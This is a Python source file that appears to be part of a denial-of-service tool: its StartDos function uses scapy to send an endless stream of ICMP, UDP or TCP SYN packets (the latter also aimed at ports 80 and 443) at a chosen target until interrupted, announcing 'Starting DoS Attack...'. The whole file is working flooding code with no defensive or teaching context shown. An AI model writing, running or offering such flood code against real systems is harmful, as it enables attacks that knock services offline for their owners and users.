
from scapy.all import IP, ICMP, send, TCP, UDP
from rich.console import Console
import json
import signal
import sys

console = Console()

stop_requested = False


def _handle_sigint(signum, frame):
    global stop_requested
    stop_requested = True

# Calling the settings.json file to use its contents
try:
    with open("config/settings.json") as f:
        config = json.load(f)
except FileNotFoundError as e:
    print(
        f"Configuration file not found: {e}"
    )
    sys.exit(1)

verbose = config["verbose"]

def StartDos(Target,
             protocol):
    
    global stop_requested

    stop_requested = False
    previous_handler = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, _handle_sigint)

    try:
        console.print(
            "Starting DoS Attack...", style="bold yellow"
            )

        console.print(
            "Press Ctrl+C to stop the attack."
            )

        while not stop_requested:
            if not Target or not protocol:
                console.print(
                    "No Target or protocol provided. Please provide both.", style="yellow"
                )
                break

            if protocol.lower() == "icmp":
                ip_layer = IP(dst=Target)
                icmp = ICMP()
                send(ip_layer/icmp, verbose=verbose)
            elif protocol.lower() == "tcp":
                ip_layer = IP(dst=Target)
                tcp = TCP(flags="S")
                send(ip_layer/tcp, verbose=verbose)
            elif protocol.lower() == "udp":
                ip_layer = IP(dst=Target)
                udp = UDP()
                send(ip_layer/udp, verbose=verbose)
            elif protocol.lower() == "http":
                ip_layer = IP(dst=Target)
                tcp = TCP(dport=80, flags="S")
                send(ip_layer/tcp, verbose=verbose)
            elif protocol.lower() == "https":
                ip_layer = IP(dst=Target)
                tcp = TCP(dport=443, flags="S")
                send(ip_layer/tcp, verbose=verbose)
            else:
                console.print(
                    f"Unknown protocol: {protocol}", style="yellow"
                )
                break
    except KeyboardInterrupt:
        console.print(
            "DoS Attack stopped.", style="yellow"
            )
    finally:
        signal.signal(signal.SIGINT, previous_handler)
        if stop_requested:
            console.print(
                "DoS Attack stopped.", style="yellow"
                )
            sys.exit(0)